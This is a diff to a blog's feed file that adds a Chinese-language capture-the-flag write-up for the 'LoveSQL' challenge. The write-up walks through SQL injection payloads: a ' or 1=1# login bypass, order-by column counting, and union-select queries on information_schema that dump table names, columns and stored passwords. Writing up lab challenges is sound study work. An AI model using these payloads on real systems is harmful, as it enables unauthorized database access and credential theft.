@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>极客大挑战2019-LoveSQL</title>
+      <link href="/2022/03/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/"/>
+      <url>/2022/03/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/</url>
+      
+        <content type="html"><![CDATA[<p>1、<br>万能密码: <code>&#39; or 1=1#</code><br><img src="/picture/web20.png"></p><p>2、<br>查列数:<br><code>&#39; or 1=1 order by 1#</code><br><code>&#39; or 1=1 order by 2#</code><br><code>&#39; or 1=1 order by 3#</code><br><code>&#39; or 1=1 order by 4#</code></p><p>4的时候报错，所以有三列<br><img src="/picture/web21.png"></p><p>3<br>查数据库:<br><code>-1&#39;union select 1,2,database()#</code></p><p>为什么这里不用万能密码了呢？因为不需要，井号已经把查询密码的注释掉了<br>前面的-1是干什么用的呢？因为我们看到它只能显示出两条数据，一个是用户名，一个是密码。所以这个-1就是让这个查不出来(也可以是其他的比如1)，这个再union注入那里有写<br><img src="/picture/web22.png"><br>至于为什么出来了2，而1没有出来，我也不太清楚</p><p>所以查出来数据库是geek</p><p>4、<br>查表<br><code>-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code><br>其实上一步查数据库是可以省略的，因为直接<code>where table_schema=database()</code>即可</p><p><img src="/picture/web23.png"><br>可以看到查到了两个表，geekuser,l0ve1ysq1</p><p>5、查字段<br><code>-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;#</code></p><p>先看下l0ve1ysq1表，同理可得geekuser<br><img src="/picture/web24.png"></p><p>可以看到有三个字段id,username,password</p><p>6、查数据<br><code>-1&#39;union select 1,2,group_concat(password) from geek.l0ve1ysq1#</code><br>先查password的数据<br><img src="/picture/web25.png"><br>也可以直接把三个字段数据全部爆出来<br><code>-1&#39;union select 1,2,group_concat(id,username,password) from geek.l0ve1ysq1#</code></p><p>flag直接出来了</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>sql注入和sqlmap的使用</title>
       <link href="/2022/03/17/sql%E6%B3%A8%E5%85%A5/"/>
       <url>/2022/03/17/sql%E6%B3%A8%E5%85%A5/</url>
